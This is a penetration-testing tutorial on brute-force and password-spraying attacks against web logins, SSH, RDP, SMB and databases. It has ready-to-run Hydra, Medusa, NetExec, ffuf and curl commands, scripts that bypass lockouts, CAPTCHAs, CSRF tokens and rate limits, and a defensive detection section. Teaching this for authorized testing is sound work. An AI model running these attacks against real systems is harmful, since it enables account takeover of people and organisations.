# Complete Bruteforcing Methodology: From Basic Attacks to Advanced Exploitation

Bruteforcing remains one of the most effective attack vectors in cybersecurity. In 2025-2026, researchers documented real-world Golang-based SSH bruteforce malware actively used in the wild, with attackers claiming successful access to over 5,414 servers . This comprehensive guide walks through complete methodologies for testing authentication mechanisms, using real-world examples, tools like Burp Suite and Hydra, and proven exploitation techniques.

---

## Table of Contents

1. [Understanding Bruteforce Attack Types](#understanding-bruteforce-attack-types)
2. [Methodology Overview](#methodology-overview)
3. [Phase 1: Pre-Attack Reconnaissance](#phase-1-pre-attack-reconnaissance)
4. [Phase 2: Web Application Bruteforcing with Burp Suite](#phase-2-web-application-bruteforcing-with-burp-suite)
5. [Phase 3: Service Bruteforcing with Hydra, Medusa, and Ncrack](#phase-3-service-bruteforcing-with-hydra-medusa-and-ncrack)
6. [Phase 4: Password Spraying Techniques](#phase-4-password-spraying-techniques)
7. [Phase 5: Advanced Evasion and Bypass Methods](#phase-5-advanced-evasion-and-bypass-methods)
8. [Real-World Exploitation Examples](#real-world-exploitation-examples)
9. [Detection and Mitigation for Blue Teams](#detection-and-mitigation-for-blue-teams)
10. [Complete Testing Checklist](#complete-testing-checklist)

---

## Understanding Bruteforce Attack Types

Before diving into tools and techniques, it's essential to understand the three primary types of credential attacks:

| Attack Type | Description | When to Use | Risk Level |
|-------------|-------------|-------------|------------|
| **Traditional Bruteforce** | Many passwords against one username | When you have a valid username | High - Triggers account lockouts |
| **Password Spraying** | One password against many usernames | When lockout policies exist (3-5 attempts) | Low - Avoids detection |
| **Credential Stuffing** | Known credentials from breaches | When users reuse passwords | Medium - Depends on breach quality |

### Real-World Context

In documented attacks from late 2025, threat actors deployed Golang-based SSH bruteforce malware that used worker pool design enabling hundreds to thousands of concurrent login attempts . The malware included sophisticated features like:
- Honeypot detection scoring
- Post-authentication reconnaissance
- Configurable timeouts for slow networks
- Automatic credential logging for downstream exploitation

---

## Methodology Overview

The complete bruteforce testing methodology follows this 5-phase structure:

```
┌─────────────────────────────────────────────────────────────────────┐
│                    BRUTEFORCE TESTING METHODOLOGY                    │
├───────────────┬─────────────────┬─────────────────┬─────────────────┤
│    Phase 1    │    Phase 2      │    Phase 3      │    Phase 4      │
│ Reconnaissance│   Service       │   Credential    │   Exploitation  │
│  & Discovery  │   Enumeration   │   Testing       │  & Verification │
├───────────────┼─────────────────┼─────────────────┼─────────────────┤
│ • Port scan   │ • Identify auth │ • Hydra         │ • Session       │
│ • Service     │   mechanisms    │ • Medusa        │   validation    │
│   detection   │ • Extract       │ • Ncrack        │ • Privilege     │
│ • Technology  │   parameters    │ • Burp Intruder │   escalation    │
│   fingerprint │ • Find error    │ • WFuzz         │ • Lateral       │
│ • User enum   │   messages      │ • Patator       │   movement      │
└───────────────┴─────────────────┴─────────────────┴─────────────────┘
```

---

## Phase 1: Pre-Attack Reconnaissance

### 1.1 Service Discovery and Port Scanning

Before attempting any bruteforce attack, you must understand what services are exposed.

```bash
# Comprehensive port scan with service detection
nmap -sV -sC -p- target.com -oA full_scan

# Fast port scan across all ports
masscan -p1-65535 --rate=10000 target.com --output-format grepable -o masscan.out

# Service-specific scanning for common bruteforce targets
nmap -p 21,22,23,25,80,443,445,3389,3306,5432,27017 target.com -sV
```

**Example from real testing environment:** In a documented penetration test against a simulated corporate network, researchers discovered multiple vulnerable services including vsftpd 2.3.4 (CVE-2011-2523, CVSS 10.0), UnrealIRCd (CVE-2010-2075), and OpenSSH 4.7p1 .

### 1.2 User Enumeration

Attackers often spend significant effort enumerating valid usernames before password attacks.

**SMB User Enumeration:**
```bash
# Enumerate users via SMB
enum4linux -U target.com
netexec smb target.com -u '' -p '' --users

# Results from actual test (Metasploitable 2)
# Found users: msfadmin, user, postgres, service, games, nobody
```

**SMTP User Enumeration:**
```bash
# VRFY and EXPN commands
smtp-user-enum -M VRFY -U users.txt -t target.com
```

**Web Application User Enumeration:**
```bash
# Burp Suite Intruder for username enumeration
# Look for different error messages or response times
ffuf -w usernames.txt -u https://target.com/login -X POST \
  -d "username=FUZZ&password=test" -fr "Invalid username"
```

**Kerberos User Enumeration (Active Directory):**
```bash
kerbrute userenum --dc dc.target.com -d target.com users.txt
```

### 1.3 Technology Fingerprinting

Understanding the target technology stack helps select appropriate wordlists and attack methods.

```bash
# Web technology detection
whatweb https://target.com

# CMS detection
cmseek -u https://target.com

# Framework detection
wappalyzer (browser extension)
```

For web applications, identify:
- CMS type (WordPress, Joomla, Drupal, Magento)
- Authentication mechanisms (session-based, JWT, OAuth)
- Rate limiting and lockout policies
- CSRF token implementation

### 1.4 Wordlist Selection and Generation

The effectiveness of bruteforcing depends heavily on wordlist quality.

**Built-in Wordlists (Kali Linux):**
```bash
/usr/share/wordlists/rockyou.txt          # 14M passwords
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

**Custom Wordlist Generation:**
```bash
# CeWL - Spider website for custom words
cewl https://target.com -d 3 -m 5 -w custom.txt

# HashCat rules for mutations
hashcat --stdout -r best64.rule base.txt > mutated.txt

# CUPP - Generate password lists from personal information
python3 cupp.py -i
```

**Real-world note:** The RockYou password list, containing millions of real-world passwords from the 2009 RockYou data breach, remains highly effective for testing despite its age .

---

## Phase 2: Web Application Bruteforcing with Burp Suite

Burp Suite is the industry standard for web application testing. The Intruder tool provides powerful capabilities for automating login attacks.

### 2.1 Setting Up Burp Suite for Bruteforce Testing

**Step-by-step methodology based on real DVWA testing :**

**Step 1: Configure Proxy and Capture Login Request**
1. Launch Burp Suite and navigate to Proxy → Intercept
2. Turn Intercept ON
3. Navigate to the target login page
4. Enter test credentials (e.g., username: "test", password: "1234")
5. Submit the form
6. Burp captures the HTTP request

**Step 2: Send to Intruder**
1. Right-click on the intercepted request
2. Select "Send to Intruder" (or press Ctrl+I)
3. Navigate to the Intruder tab

**Step 3: Configure Attack Positions**
The captured request typically looks like:
```
POST /dvwa/login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=test&password=1234&Login=Login
```

1. Clear all auto-selected payload positions
2. Highlight the username value ("test") and click "Add §"
3. Highlight the password value ("1234") and click "Add §"
4. The request now shows: `username=§test§&password=§1234§&Login=Login`

**Step 4: Select Attack Type**
For username+password bruteforcing, select **Cluster bomb** attack type. This tests every combination of username and password payloads .

| Attack Type | Description | Use Case |
|-------------|-------------|----------|
| Sniper | Single payload set, one position at a time | Testing one variable |
| Battering ram | Same payload to multiple positions | When username=password |
| Pitchfork | Multiple payload sets, paired together | Known username:password pairs |
| Cluster bomb | All combinations of multiple payload sets | Full bruteforce |

**Step 5: Configure Payloads**

Under the Payloads tab:
- **Payload set 1 (usernames):** Paste list of potential usernames
- **Payload set 2 (passwords):** Paste list of potential passwords

**Step 6: Launch Attack**
Click "Start Attack" and monitor results.

### 2.2 Analyzing Bruteforce Results

**Identifying Successful Logins :**

After the attack completes, analyze response characteristics:

| Indicator | What to Look For | Significance |
|-----------|------------------|--------------|
| Status Code | 302 vs 200 | Redirect often indicates success |
| Response Length | Different length | Success page has different content size |
| Response Content | "Welcome" vs "Invalid credentials" | Direct success message |
| Response Time | Slower response | Additional processing for success |

**Real Example from DVWA Testing :**
- Failed login response length: ~3800 bytes
- Successful login response length: ~4200 bytes
- The difference of ~400 bytes clearly identified valid credentials

To compare responses:
1. Right-click on suspicious entry → "Send to Comparer"
2. Add normal failed response to Comparer
3. Compare Words or Bytes to see differences

### 2.3 Advanced Burp Suite Techniques

**Using Grep-Match for Automatic Detection:**
1. In Intruder → Options tab
2. Add "Welcome", "Dashboard", or other success indicators to Grep-Match
3. Burp automatically highlights successful responses

**Handling CSRF Tokens:**
Modern applications use CSRF tokens that change with each request. Use Burp's session handling rules:
1. Add a macro that extracts CSRF token from login page
2. Configure session handling rule to use macro before each request
3. Set token as request parameter

**Testing Against Rate-Limited Applications:**
```yaml
# Intruder → Resource Pool
# Set Maximum concurrent requests: 1
# Add delays between requests: 1000-3000ms
```

### 2.4 Alternative Web Bruteforce Tools

**WFuzz - Command-line web fuzzer:**
```bash
# POST form bruteforce with Cluster bomb style
wfuzz -c -z file,users.txt -z file,passwords.txt \
  -d "username=FUZZ&password=FUZ2Z&Login=Login" \
  https://target.com/login.php --hc 400,404

# Filter by response length
wfuzz -z file,passwords.txt --filter "Content-Length != 3800" \
  -d "username=admin&password=FUZZ" https://target.com/login
```

**ffuf - Fast web fuzzer:**
```bash
# Multi-position bruteforce
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u https://target.com/login \
  -X POST -d "username=USER&password=PASS" \
  -fc 401 -mc 200,302

# With rate limiting
ffuf -w passwords.txt -u https://target.com/login \
  -X POST -d "user=admin&pass=FUZZ" \
  -rate 10 -p 0.5-2.0
```

---

## Phase 3: Service Bruteforcing with Hydra, Medusa, and Ncrack

Network services (SSH, FTP, RDP, SMB, databases) are common bruteforce targets. Real-world malware often targets these services at scale .

### 3.1 Hydra - The Standard Network Login Cracker

Hydra supports over 50 protocols and is the go-to tool for network service bruteforcing.

**SSH Bruteforce:**
```bash
# Single user, password list
hydra -l root -P passwords.txt ssh://target.com

# User list, single password (password spraying)
hydra -L users.txt -p 'Summer2024!' ssh://target.com

# With slow-down to avoid detection
hydra -L users.txt -P passwords.txt ssh://target.com -t 4 -w 3

# Save results
hydra -L users.txt -P passwords.txt ssh://target.com -o results.txt
```

**FTP Bruteforce (Real lab example ):**
```bash
# Using Medusa for FTP
medusa -h 192.168.56.101 -u ftp -P wordlist.txt -M ftp

# Results from actual test:
# ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: ftp Password: password
# ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: ftp Password: admin
# ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: ftp Password: root
```

**RDP (Remote Desktop Protocol):**
```bash
# RDP bruteforce with Hydra
hydra -l administrator -P passwords.txt rdp://target.com

# Ncrack for RDP (more efficient)
ncrack -p 3389 --user administrator -P passwords.txt target.com
```

**SMB (Windows File Sharing):**
```bash
# Hydra SMB module
hydra -L users.txt -P passwords.txt smb://target.com

# NetExec (successor to CrackMapExec) - Industry standard
netexec smb target.com -u users.txt -p passwords.txt

# Password spraying with NetExec
netexec smb target.com -u users.txt -p 'Company2024!' --continue-on-success
```

**Database Services:**
```bash
# MySQL
hydra -l root -P passwords.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P passwords.txt postgresql://target.com

# MongoDB
hydra -l admin -P passwords.txt mongodb://target.com
```

### 3.2 Medusa - Parallel Login Brute-forcer

Medusa is designed for parallel bruteforcing and is particularly effective against FTP and SSH .

```bash
# Basic syntax
medusa -h target.com -u username -P passwords.txt -M ssh

# Multiple hosts
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh

# Output to file
medusa -h target.com -u admin -P passwords.txt -M ftp -O results.txt

# Verbose output for debugging
medusa -h target.com -u admin -P passwords.txt -M ssh -v 6
```

### 3.3 Ncrack - High-Performance Network Authentication Cracker

Ncrack is designed for speed and supports resume functionality. Real-world research has used Ncrack to measure bruteforce throughput across different network conditions .

```bash
# Basic SSH attack
ncrack -p 22 --user root -P passwords.txt target.com

# RDP with custom options
ncrack -p 3389 --user administrator -P passwords.txt -T 5 target.com

# Multiple targets
ncrack -iL targets.txt -p ssh --user root -P passwords.txt

# Resume interrupted attack
ncrack --resume save_file
```

**Performance Research Findings :**
- Local network throughput: Hundreds of passwords per second
- LTE network throughput: Significantly lower (order of magnitude)
- Packet loss severely impacts attack efficiency

---

## Phase 4: Password Spraying Techniques

Password spraying is the most effective technique against modern authentication systems with lockout policies. It uses one password against many usernames, staying under detection thresholds.

### 4.1 Password Spraying Methodology

**Step 1: Enumerate Valid Usernames**
```bash
# SMB enumeration
enum4linux -U target.com | grep "user:" | awk '{print $2}' > valid_users.txt

# O365 username enumeration
o365spray --enum -u users.txt --url https://login.microsoftonline.com

# SMTP VRFY
smtp-user-enum -M VRFY -U users.txt -t mail.target.com
```

**Step 2: Research Common Password Patterns**
Common enterprise password patterns include:
- Season + Year (Spring2024, Summer2024, Winter2025)
- Company name + number (Contoso123, Target2024)
- Month + Year (October2024, January2025)
- Default corporate password policy examples

**Step 3: Execute Spray with Delays**
```bash
# Hydra password spray (-u flag iterates usernames for each password)
hydra -L valid_users.txt -p 'Summer2024!' target.com http-post-form "/login:..." -u -t 1 -w 5

# NetExec SMB spray
netexec smb target.com -u valid_users.txt -p 'Company2024!' --continue-on-success

# Ncrack spray mode
ncrack -p 3389 -U valid_users.txt -P single_password.txt target.com -T 1
```

### 4.2 Real-World Password Spraying Example

From documented testing against Metasploitable 2 :

```bash
# First, enumerate SMB users
enum4linux -U 192.168.56.101 | tee smb_users.txt

# Found users include: msfadmin, user, postgres, games, nobody

# Password spraying with common default credentials
hydra -L smb_users.txt -p 'msfadmin' smb://192.168.56.101 -W 2 -o spray_results.txt

# Successful spray: msfadmin:msfadmin
```

### 4.3 Password Spraying Tools

**NetExec (formerly CrackMapExec):**
```bash
# Single password spray
netexec smb target.com -u users.txt -p 'Winter2024!' --continue-on-success

# Multiple passwords (careful with lockouts)
netexec smb target.com -u users.txt -p passwords.txt --no-bruteforce
```

**Kerbrute for Active Directory:**
```bash
# Password spraying via Kerberos (doesn't trigger lockouts as easily)
kerbrute passwordspray -d target.com --dc dc.target.com users.txt 'Fall2024!'
```

---

## Phase 5: Advanced Evasion and Bypass Methods

Modern applications implement various protections. Here are proven bypass techniques.

### 5.1 Rate Limiting Bypass

**Method 1: Slow Down Requests**
```bash
# Hydra with single thread and wait
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:..." -t 1 -w 5

# ffuf with random delays
ffuf -w passwords.txt -u https://target.com/login -p 1-5
```

**Method 2: IP Rotation**
```bash
# Using proxychains with rotating proxy list
cat proxies.txt
socks4 127.0.0.1 9050
http 192.168.1.100 8080
http 192.168.1.101 8080

# Launch Hydra through proxychains
proxychains hydra -l admin -P passwords.txt target.com http-post-form "/login:..."
```

**Method 3: Distributed Attack**
```bash
# Split wordlist across multiple machines
split -l 1000 passwords.txt part_
# Distribute parts to different source IPs
```

### 5.2 Account Lockout Bypass

**Method 1: Password Spraying**
Instead of many passwords against one account, use one password against many accounts. This stays under typical 3-5 attempt lockout thresholds.

**Method 2: Lockout Reset Detection**
Some systems reset lockout counters after a specific time (e.g., 15 minutes). Tools can track this:
```python
# Pseudo-code for lockout-aware spraying
for password in password_list:
    for user in user_list:
        attempt_login(user, password)
        if lockout_detected(user):
            wait(lockout_duration)
            continue
```

### 5.3 CAPTCHA Bypass

**Method 1: Low-Fidelity CAPTCHA**
Some implementations use simple CAPTCHAs that can be automated:
```bash
# Using OCR for simple CAPTCHAs
tesseract captcha.png output
```

**Method 2: CAPTCHA Reuse**
Some applications allow CAPTCHA token reuse for multiple requests.

**Method 3: Session Handling**
```bash
# Some CAPTCHAs are only validated on the first request of a session
# Solution: Create new session for each attempt
for password in passwords.txt; do
  SESSION=$(curl -c cookies.txt -s https://target.com/login | grep session)
  CAPTCHA=$(curl -b cookies.txt -s https://target.com/captcha)
  curl -b cookies.txt -X POST -d "password=$password&captcha=$CAPTCHA" https://target.com/login
  rm cookies.txt
done
```

### 5.4 CSRF Token Bypass

**Method: Token Extraction Automation**
```bash
#!/bin/bash
# Extract CSRF token and use in subsequent request

while read password; do
  # Get fresh token
  TOKEN=$(curl -s https://target.com/login | grep -oP 'name="csrf" value="\K[^"]+')
  
  # Submit with token
  curl -X POST -d "user=admin&pass=$password&csrf=$TOKEN" \
    -c cookies.txt -b cookies.txt https://target.com/login
  
  sleep 2
done < passwords.txt
```

### 5.5 Honeypot Detection Evasion

Real-world malware now includes honeypot detection capabilities . Understanding these helps testers avoid detection:

**Common honeypot detection signals:**
- Unnatural response times
- Known honeypot process names
- Suspicious filesystem patterns
- Failed write operations
- Network behavior inconsistencies

**Evasion techniques:**
```bash
# Mimic legitimate user behavior
# - Use realistic delays between attempts
# - Rotate user agents
# - Vary request patterns
# - Use real browser fingerprints
```

---

## Real-World Exploitation Examples

### Example 1: SSH Bruteforce Malware Campaign (2025-2026)

Researchers documented a sophisticated Golang-based SSH bruteforce malware with the following characteristics :

**Attack Flow:**
1. Initial access via weak SSH credentials
2. Automated reconnaissance (hostname, uname -a, uptime, ps aux, netstat -tulpn)
3. Environment profiling to determine target value
4. Deployment of scanning tools (ZMap for internet-wide SSH discovery)
5. Distributed SSH bruteforcing using compromised hosts

**Malware Capabilities:**
```go
// Snippet from analyzed SSH.go malware
// Features include:
// - Host key verification disabled
// - Worker pool design for high concurrency
// - Configurable timeouts
// - Honeypot detection scoring
// - Automatic credential logging
```

**Observed Scale:** Attackers claimed successful access to 5,414 servers, marking 4,843 as honeypots .

### Example 2: Web Application Bruteforce on DVWA

**Environment:**
- Target: Damn Vulnerable Web Application
- Security Level: Low/Medium
- Tool: Burp Suite Intruder

**Attack Execution :**
1. Captured login POST request
2. Set username and password as payload positions
3. Used Cluster bomb attack type
4. Usernames: admin, user, test, guest
5. Passwords: password, admin, 123456, root

**Results:**
```
Request 42 - Length 4200 bytes (Successful)
Username: admin, Password: password
Response: "Welcome to the password protected area admin"
```

### Example 3: SMB Password Spraying on Metasploitable 2

**Attack Execution :**
```bash
# Step 1: Enumerate users
enum4linux -U 192.168.56.101
# Found: msfadmin, user, postgres, games, nobody, service

# Step 2: Password spray with common default
hydra -L smb_users.txt -p 'msfadmin' smb://192.168.56.101 -W 2

# Result: msfadmin:msfadmin - Valid credentials found
```

### Example 4: CVE Exploitation Chain Including Bruteforce

In a documented penetration test, researchers combined bruteforce with known vulnerabilities :

| Service | Vulnerability | Bruteforce Result |
|---------|--------------|-------------------|
| vsftpd 2.3.4 | CVE-2011-2523 (CVSS 10.0) | Not needed - backdoor |
| OpenSSH 4.7p1 | CVE-2023-38408 | msfadmin:msfadmin |
| SMB | No vulnerability | msfadmin:msfadmin |

---

## Detection and Mitigation for Blue Teams

Understanding detection helps both attackers avoid detection and defenders protect their systems.

### Detection Indicators

From real-world attack analysis , monitor for:

**Network Indicators:**
- Single IP attempting authentication to multiple accounts
- Impossible travel (logins from geographically distant IPs in short timeframes)
- Unusual user agent strings
- High volume of failed authentication attempts
- Short-lived, high-volume connection bursts

**Host Indicators:**
- Unexpected process execution (ps aux, netstat -tulpn)
- Compilation of source code on servers
- Unusual outbound SSH connections
- Presence of scanning tools (nmap, masscan, zmap)

**Authentication Log Indicators:**
- Multiple failed logins followed by success
- Login attempts outside business hours
- Logins from unexpected locations
- Concurrent sessions from different IPs

### Mitigation Strategies

**Immediate Protections:**
1. Implement account lockout policies (3-5 attempts)
2. Deploy rate limiting on authentication endpoints
3. Require MFA for all remote access
4. Use CAPTCHA on public login forms

**Long-term Solutions:**
1. Implement password complexity requirements (12+ characters)
2. Block common and breached passwords
3. Deploy user behavior analytics
4. Regular security awareness training
5. Implement network segmentation

**Detection Tools:**
```bash
# Monitor failed login attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Check for password spraying patterns
grep "authentication failure" /var/log/auth.log | awk -F 'rhost=' '{print $2}' | cut -d' ' -f1 | sort | uniq -c | sort -nr
```

---

## Complete Testing Checklist

### Pre-Attack Checklist
- [ ] Obtain written authorization for testing
- [ ] Define scope and boundaries
- [ ] Set up isolated testing environment
- [ ] Prepare wordlists (generic and custom)
- [ ] Identify target services and versions
- [ ] Enumerate valid usernames if possible

### Web Application Testing
- [ ] Capture login request with Burp Proxy
- [ ] Identify all parameters in authentication request
- [ ] Check for CSRF tokens and session handling
- [ ] Configure Intruder with appropriate attack type
- [ ] Load username and password payloads
- [ ] Set up Grep-Match for success indicators
- [ ] Configure resource pool for rate limiting
- [ ] Launch attack and analyze results
- [ ] Verify successful credentials manually

### Service Testing
- [ ] Scan for open services (nmap)
- [ ] Identify service versions
- [ ] Check for default credentials first
- [ ] Select appropriate tool (Hydra/Medusa/Ncrack)
- [ ] Configure threading and delays
- [ ] Execute attack with user list
- [ ] Execute password spray if lockout concerns
- [ ] Document successful credentials

### Post-Exploitation
- [ ] Verify access with successful credentials
- [ ] Document privilege level
- [ ] Check for additional access possibilities
- [ ] Test lateral movement from compromised host
- [ ] Document findings in report

---

## Tool Reference Summary

| Tool | Best For | Key Features |
|------|----------|--------------|
| **Burp Suite Intruder** | Web forms | GUI, CSRF handling, session management |
| **Hydra** | Network services | 50+ protocols, fast parallel attacks |
| **Medusa** | FTP/SSH | Parallel connections, modular |
| **Ncrack** | RDP/SSH | High performance, resume capability |
| **NetExec** | Active Directory | SMB, LDAP, spray automation |
| **WFuzz** | Web fuzzing | Flexible, command-line, filtering |
| **ffuf** | Web fuzzing | Fast, multi-position, rate limiting |
| **Kerbrute** | Kerberos | User enum, password spray without lockout |

---

## Related Topics

- [Password Cracking](https://www.pentest-book.com/others/password-cracking) - Hash cracking with HashCat and John the Ripper
- [Wordlist Reference](https://www.pentest-book.com/others/wordlist-reference) - Wordlist selection and creation guide
- MFA Bypass Techniques (Push bombing, session hijacking, SIM swapping)
- Post-Exploitation Lateral Movement

---
